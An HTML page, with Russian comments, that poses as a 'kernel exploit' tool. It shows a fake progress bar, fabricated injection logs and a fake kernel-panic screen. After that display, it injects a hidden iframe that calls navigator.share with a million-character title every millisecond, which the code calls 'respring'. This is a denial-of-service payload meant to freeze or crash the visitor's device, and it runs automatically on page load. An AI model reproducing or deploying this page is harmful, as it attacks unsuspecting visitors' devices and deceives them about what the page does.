<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Exploiting...</title>
    <style>
        body { font-family: -apple-system, sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #000; color: white; overflow: hidden; }
        .main-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); border-radius: 38px; padding: 35px 25px; width: 85%; max-width: 360px; text-align: center; z-index: 10; position: relative; }
        h1 { font-size: 1.7rem; text-transform: uppercase; margin: 0; }
        .patient-msg { font-size: 11px; color: #32d74b; margin: 10px 0 20px; font-weight: bold; text-transform: uppercase; }
        .progress-container { background: rgba(255, 255, 255, 0.1); height: 4px; border-radius: 10px; margin-bottom: 20px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: #fff; transition: width 0.05s linear; }
        #console { background: rgba(0, 0, 0, 0.6); border-radius: 22px; padding: 18px; height: 180px; font-family: 'SF Mono', monospace; font-size: 9px; color: #32d74b; text-align: left; overflow: hidden; }
        #panic-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #700; color: #fff; z-index: 9999; padding: 10px; font-size: 7px; word-break: break-all; }
        .error-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #000; padding: 20px; font-weight: 900; font-size: 25px; z-index: 10000; text-transform: uppercase; border: 4px solid #000; }
    </style>
</head>
<body>
    <div id="panic-screen"></div>
    <div class="main-card">
        <h1>Exploiting Kernel</h1>
        <div class="patient-msg">Please be patient, do not close the browser</div>
        <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
        <div id="console"></div>
    </div>
    <script>
        const bar = document.getElementById('bar');
        const consoleEl = document.getElementById('console');
        const panicEl = document.getElementById('panic-screen');
        let barW = 0;

        // Скорость прогресс-бара
        const interval = setInterval(() => {
            barW += 5; // Очень быстро
            bar.style.width = barW + "%";
            if(barW >= 100) {
                clearInterval(interval);
                triggerPanic();
            }
        }, 50);

        // Скорость текста
        function addLog() {
            if(barW < 100) {
                const div = document.createElement('div');
                div.innerText = `> 0x${Math.random().toString(16).substr(2,8).toUpperCase()}: CRITICAL_DATA_INJECTED`;
                consoleEl.appendChild(div);
                consoleEl.scrollTop = consoleEl.scrollHeight;
                setTimeout(addLog, 30);
            }
        }
        addLog();

        function triggerPanic() {
            panicEl.style.display = 'block';
            setInterval(() => { panicEl.innerText += ` FATAL_ERROR_0x${Math.random().toString(16)} `; }, 10);
            const overlay = document.createElement('div');
            overlay.className = 'error-overlay';
            overlay.innerText = "Kernel Panic!";
            document.body.appendChild(overlay);
            
            // Код respring
            setTimeout(() => {
                const frame = document.createElement('iframe');
                frame.style.display = 'none';
                frame.srcdoc = "<script>setInterval(()=>navigator.share({title:'X'.repeat(1000000)}),1)<\/script>";
                document.body.appendChild(frame);
            }, 500);
        }
    </script>
</body>
</html>
